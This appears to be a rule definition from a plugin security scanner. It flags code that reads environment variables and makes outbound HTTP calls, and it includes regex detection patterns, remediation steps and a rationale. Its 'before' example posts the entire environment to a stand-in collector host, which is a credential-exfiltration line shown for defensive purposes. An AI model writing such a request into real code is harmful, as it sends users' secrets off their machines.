---
ruleId: SS-PLUGIN-SECRET-EXFIL-ENV-NET-01
severity: critical
subScore: security
weight: 35
status: active
shadowUntil: null
appliesTo: [plugin]
title: >-
  Reads environment variables and makes outbound HTTP calls in the same plugin
categoryLabel: >-
  Credential exfiltration
explanation: >-
  This plugin reads from the environment (where API keys, tokens, and AWS
  credentials live) and also makes outbound network calls. When both sit in the
  same code, a secret read from the env can be packed into a request and sent off
  the machine the moment the plugin runs.
severityRationale: >-
  the env-read and HTTP-call primitives that enable silent credential theft both
  appear in one plugin — the worst-case outcome for the security sub-score.
remediation:
  action: >-
    Confirm no environment secret flows into an outbound request; scope any read
    to the value the call legitimately needs.
  steps:
    - >-
      Trace each env read to its destination; ensure no secret value reaches an
      outbound body, header, or query string.
    - >-
      If a call genuinely needs a credential, send it only to the API it
      authenticates against, over TLS, never to a third party.
  saferPattern:
    before: |-
      requests.post("https://collector.example.com", data=os.environ)
    after: |-
      # send only the field the API needs, to the API it authenticates against
      requests.post(api_url, headers={"Authorization": f"Bearer {scoped_token}"}, json={"job_id": job_id})
trigger:
  type: composite_and_or
  op: and
  children:
    - type: regex_match
      pattern: '(?i)\b(?:process\.env|os\.environ|os\.getenv|System\.getenv|GetEnvironmentVariable)\b'
      scope:
        paths: ['**/*.py', '**/*.ts', '**/*.js', '**/*.mjs', '**/*.cjs']
    - type: regex_match
      pattern: '(?i)\b(?:fetch|axios|http\.request|httpx|requests\.|urllib|Net::HTTP|XMLHttpRequest|navigator\.sendBeacon)\b'
      scope:
        paths: ['**/*.py', '**/*.ts', '**/*.js', '**/*.mjs', '**/*.cjs']
limitations:
  - "Composite trigger detects only the *coexistence* of env-read and HTTP-call primitives in the same plugin. Cannot prove that env values flow into HTTP bodies (taint analysis is deferred to v2)."
  - "FP risk on legitimate plugins that legitimately read env (e.g. an API key) AND call out (e.g. to the API endpoint that requires the key). The pattern is normal for any service-integration plugin; treat the rule as a signal-to-review, not a verdict."
  - "Cannot detect dynamic env access via Reflect / getattr / runtime-string."
priorArt:
  - https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
  - https://snyk.io/blog/leaking-environment-variables-malicious-package/
  - https://socket.dev/blog/the-pivotal-role-of-supply-chain-attacks-in-2024
---

# SS-PLUGIN-SECRET-EXFIL-ENV-NET-01 — Plugin reads env and calls out (exfil candidate)

## Rationale

The coexistence of environment-variable reads and outbound HTTP calls in a
plugin's source code is the structural signal of potential credential
exfiltration. OWASP A3:2017 (Sensitive Data Exposure), Snyk's malicious-
package analysis, and Socket's 2024 supply-chain retrospective all
document the pattern: an installable plugin reads the user's env (where
API tokens, AWS credentials, etc. live), constructs an HTTP request, and
sends them to an attacker-controlled endpoint.

The composite trigger requires both primitives to exist in the same
plugin codebase. This is a coarse signal — many legitimate plugins
legitimately do both (a CI integration plugin reads CI_TOKEN and calls
the CI API). The rule fires on the structural pattern and relies on
vendor-appeal data and consumer judgment for resolution. Critical
severity is set because the outcome class (credential exfiltration) is
the worst case in the security sub-score, even though the FP rate on
this rule is expected to be the highest of the active rules.

Active at landing because the cost of a false negative (an actual
exfiltrator slipping through) is materially higher than the cost of a
false positive (a legitimate service-integration plugin needing to
explain itself via the vendor-appeal channel). The shadow lifecycle was
considered and rejected: a known-exfiltration plugin shadow-rule that
doesn't affect score is the worst of both worlds.

## False positive history

(date-stamped log; updated by FP-audit harness and vendor-appeal outcomes)

## Version history

- v1 (Phase A 2026-W2): initial rule. Active at landing as coarse signal; v2 plan is taint-analysis refinement.
